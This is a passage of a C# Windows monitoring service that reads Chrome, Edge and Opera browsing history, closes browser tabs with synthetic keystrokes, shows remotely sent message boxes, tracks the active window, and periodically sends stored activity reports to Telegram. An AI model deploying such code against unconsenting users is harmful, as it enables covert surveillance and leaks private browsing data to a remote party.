            Thread.Sleep(50); // Small grace period

            keybd_event((byte)VK_CONTROL, 0, 0, 0); // Control Down
            keybd_event((byte)VK_W, 0, 0, 0);       // W Down
            keybd_event((byte)VK_W, 0, KEYEVENTF_KEYUP, 0); // W Up
            keybd_event((byte)VK_CONTROL, 0, KEYEVENTF_KEYUP, 0); // Control Up
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to send Ctrl+W keystroke");
        }
    }

    /// <summary>
    /// Fetches the recent browsing history from Chrome, Edge, and Opera
    /// </summary>
    public List<HistoryEntry> GetBrowserHistory(int limit = 10)
    {
        var allHistory = new List<HistoryEntry>();

        var targets = new[]
        {
            new { Browser = "Chrome", Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\History") },
            new { Browser = "Edge", Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data\Default\History") },
            new { Browser = "Opera", Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera Stable\History") },
            new { Browser = "Opera (Local)", Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Opera Software\Opera Stable\History") }
        };

        foreach (var target in targets)
        {
            if (!File.Exists(target.Path))
            {
                continue;
            }

            string tempFile = Path.Combine(Path.GetTempPath(), $"hist_temp_{target.Browser.Replace(" ", "_")}");
            try
            {
                using (var sourceStream = new FileStream(target.Path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                using (var destStream = new FileStream(tempFile, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    sourceStream.CopyTo(destStream);
                }

                using (var conn = new Microsoft.Data.Sqlite.SqliteConnection($"Data Source={tempFile};Pooling=False;"))
                {
                    conn.Open();
                    string query = @"
                        SELECT url, title, visit_count, last_visit_time 
                        FROM urls 
                        ORDER BY last_visit_time DESC 
                        LIMIT $limit";

                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = query;
                        cmd.Parameters.AddWithValue("$limit", limit);

                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string url = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
                                string title = reader.IsDBNull(1) ? string.Empty : reader.GetString(1);
                                int visitCount = reader.IsDBNull(2) ? 0 : reader.GetInt32(2);
                                long chromeTime = reader.IsDBNull(3) ? 0 : reader.GetInt64(3);

                                DateTime visitTime = DateTime.MinValue;
                                if (chromeTime > 0)
                                {
                                    try
                                    {
                                        visitTime = DateTime.FromFileTimeUtc(chromeTime * 10).ToLocalTime();
                                    }
                                    catch
                                    {
                                        // Ignore parsing failures
                                    }
                                }

                                allHistory.Add(new HistoryEntry
                                {
                                    Browser = target.Browser.Replace(" (Local)", ""),
                                    Title = string.IsNullOrWhiteSpace(title) ? "[No Title]" : title,
                                    Url = url,
                                    VisitTime = visitTime,
                                    VisitCount = visitCount
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Failed to read {Browser} history database", target.Browser);
            }
            finally
            {
                try
                {
                    if (File.Exists(tempFile))
                    {
                        File.Delete(tempFile);
                    }
                }
                catch
                {
                    // Ignore temp file cleanup exceptions
                }
            }
        }

        return allHistory
            .OrderByDescending(h => h.VisitTime)
            .Take(limit)
            .ToList();
    }

    /// <summary>
    /// Displays a remote message on the screen using Win32 MessageBox P/Invoke (non-blocking)
    /// </summary>
    public void ShowRemoteMessage(string text)
    {
        Task.Run(() =>
        {
            try
            {
                // MB_OK (0x00) | MB_ICONINFORMATION (0x40) | MB_TOPMOST (0x40000) | MB_SETFOREGROUND (0x10000)
                MessageBox(IntPtr.Zero, text, "Remote Alert", 0x00000040 | 0x00040000 | 0x00010000);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Failed to show remote message box");
            }
        });
    }

    #endregion

    #region Window Monitoring Methods

    /// <summary>
    /// Gets information about the currently active window
    /// </summary>
    private (IntPtr hwnd, string appName, string windowTitle) GetActiveWindowInfo()
    {
        IntPtr hwnd = GetForegroundWindow();

        // Check if we have a valid window handle
        if (hwnd == IntPtr.Zero)
        {
            return (IntPtr.Zero, string.Empty, string.Empty);
        }

        // Get window title
        _windowTitleBuffer.Clear();
        int length = GetWindowText(hwnd, _windowTitleBuffer, _windowTitleBuffer.Capacity);
        string windowTitle = length > 0 ? _windowTitleBuffer.ToString() : string.Empty;

        // Get process ID and name
        GetWindowThreadProcessId(hwnd, out uint pid);

        try
        {
            using var process = Process.GetProcessById((int)pid);
            string appName = GetProcessName(process);

            // Filter out system processes if desired
            if (ShouldIgnoreProcess(appName))
            {
                return (IntPtr.Zero, string.Empty, string.Empty);
            }

            return (hwnd, appName, windowTitle);
        }
        catch (ArgumentException ex) when (ex.Message.Contains("is not running"))
        {
            // Process no longer exists
            return (IntPtr.Zero, string.Empty, string.Empty);
        }
        catch (Exception ex)
        {
            _logger.LogDebug(ex, "Failed to get process info for PID {Pid}", pid);
            return (IntPtr.Zero, string.Empty, string.Empty);
        }
    }

    /// <summary>
    /// Gets a clean process name
    /// </summary>
    private static string GetProcessName(Process process)
    {
        try
        {
            // Try to get the main module name, fall back to process name
            string name = process.ProcessName;

            // Add .exe extension for consistency
            if (!name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            {
                name += ".exe";
            }

            return name;
        }
        catch
        {
            // Some system processes may throw exceptions when accessing modules
            return process.ProcessName + ".exe";
        }
    }

    /// <summary>
    /// Determines if a process should be ignored (system processes, etc.)
    /// </summary>
    private bool ShouldIgnoreProcess(string processName)
    {
        // List of system processes to ignore
        string[] ignoredProcesses =
        {
            "svchost.exe",
            "dwm.exe",
            "csrss.exe",
            "wininit.exe",
            "services.exe",
            "lsass.exe",
            "winlogon.exe",
            "explorer.exe", // Windows Explorer
            "System",
            "System Idle Process",
            "RuntimeBroker.exe",
            "taskhostw.exe",
            "SearchUI.exe",
            "StartMenuExperienceHost.exe"
        };

        return Array.Exists(ignoredProcesses, p =>
            string.Equals(p, processName, StringComparison.OrdinalIgnoreCase));
    }

    #endregion

    #region Helper Methods

    private bool IsInternetAvailable()
    {
        // Avoid ICMP Ping checks because they are frequently blocked by local firewalls or networks.
        // Instead, we let the HTTP client attempt the request directly and handle failure dynamically.
        return true;
    }

    /// <summary>
    /// Truncates a string with ellipsis
    /// </summary>
    private static string Truncate(string value, int maxLength, string truncationSuffix = "...")
    {
        if (string.IsNullOrEmpty(value)) return value;
        return value.Length <= maxLength ?
            value :
            value.Substring(0, maxLength - truncationSuffix.Length) + truncationSuffix;
    }

    #endregion

    #region Background Sync Operations

    /// <summary>
    /// Background loop that periodically retries sending pending reports
    /// </summary>
    private async Task RunBackgroundSyncLoopAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("🔄 Background Sync Loop started");

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                // Sleep for 30 seconds between syncs to be responsive
                await Task.Delay(TimeSpan.FromSeconds(30), stoppingToken);

                if (IsInternetAvailable())
                {
                    await SyncPendingReportsAsync(stoppingToken);
                }
            }
            catch (TaskCanceledException)
            {
                break;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error in background sync loop");
            }
        }
    }

    /// <summary>
    /// Syncs all pending reports to Telegram
    /// </summary>
    public async Task<int> SyncPendingReportsAsync(CancellationToken stoppingToken = default)
    {
        int successfullySent = 0;
        try
        {
            // Load pending reports with up to 10 retry attempts
            var pending = _storageService.GetPendingReports(10);
            if (!pending.Any()) return 0;

            _logger.LogInformation("🔄 Syncing {Count} pending reports to Telegram...", pending.Count);

            foreach (var report in pending)
            {
                if (stoppingToken.IsCancellationRequested) break;

                try
                {
                    bool sent = await _telegramService.SendReportAsync(report);
                    if (sent)
                    {
                        report.Sent = true;
                        report.RecordSendAttempt(true);
                        _storageService.ArchiveReport(report);
                        successfullySent++;
                        _logger.LogDebug("✅ Synced report for {App}", report.AppName);
                    }
                    else
                    {
                        report.RecordSendAttempt(false, "Sync send failed");
                        if (report.SendAttempts >= 10)
                        {
                            _storageService.MoveToFailed(report);
                        }
                        else
                        {
                            _storageService.Save(report);
                        }
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "❌ Failed to sync report {Id}", report.Id);
                    report.RecordSendAttempt(false, ex.Message);
                    if (report.SendAttempts >= 10)
                    {
                        _storageService.MoveToFailed(report);
                    }
                    else
                    {
                        _storageService.Save(report);
                    }
                }

                // Short delay to respect API limits
                await Task.Delay(TimeSpan.FromMilliseconds(500), stoppingToken);
            }

            if (successfullySent > 0)
            {
                _logger.LogInformation("✅ Sync complete. Successfully sent {Count} reports.", successfullySent);
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Error during sync operation");
        }
        return successfullySent;
    }

    #endregion

    #region Cleanup

    public override async Task StopAsync(CancellationToken cancellationToken)
    {
        _logger.LogInformation("👁️ Window Monitor Worker stopping gracefully...");

        // End any active session before stopping
        if (_currentSession != null)
        {
            await EndCurrentSessionAsync();
        }

        // Save any pending reports
        _logger.LogInformation("💾 Saving final reports...");

        await base.StopAsync(cancellationToken);
    }

    #endregion
}

/// <summary>
/// Represents an entry from browser history database
/// </summary>
public class HistoryEntry
{
    public string Browser { get; set; } = string.Empty;
    public string Title { get; set; } = string.Empty;
    public string Url { get; set; } = string.Empty;
    public DateTime VisitTime { get; set; }
    public int VisitCount { get; set; }
}